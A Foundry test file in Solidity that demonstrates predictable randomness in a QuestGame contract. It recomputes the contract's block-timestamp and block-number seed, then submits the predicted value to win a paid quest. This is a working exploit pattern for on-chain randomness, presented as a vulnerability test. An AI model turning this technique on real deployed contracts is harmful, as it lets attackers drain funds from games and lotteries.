
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new QuestGame();
        
        // Fund the contract so it can pay out rewards
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    // Needed to receive the reward payment
    receive() external payable {}

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure timestamp meets the cooldown requirement (initial lastAttemptTime is 0)
        // COOLDOWN is 1 hours.
        vm.assume(blockTimestamp >= 1 hours + 1);
        vm.assume(blockNumber > block.number);
        
        // --- 2. State Configuration ---
        
        vm.deal(address(this), 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally inside the test.
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    address(this) 
                )
            )
        );

        uint256 expectedRandom = seed % 100;
        
        // Call the contract method with the predicted number.
        _contractUnderTest.attemptQuest{value: 0.1 ether}(expectedRandom);

        // Assert Predictability: Check if we won by verifying the wins counter increased.
        (, uint256 wins) = _contractUnderTest.getPlayerStats(address(this));
        assertEq(wins, 1, "Randomness should be predictable given block state");
    }
}
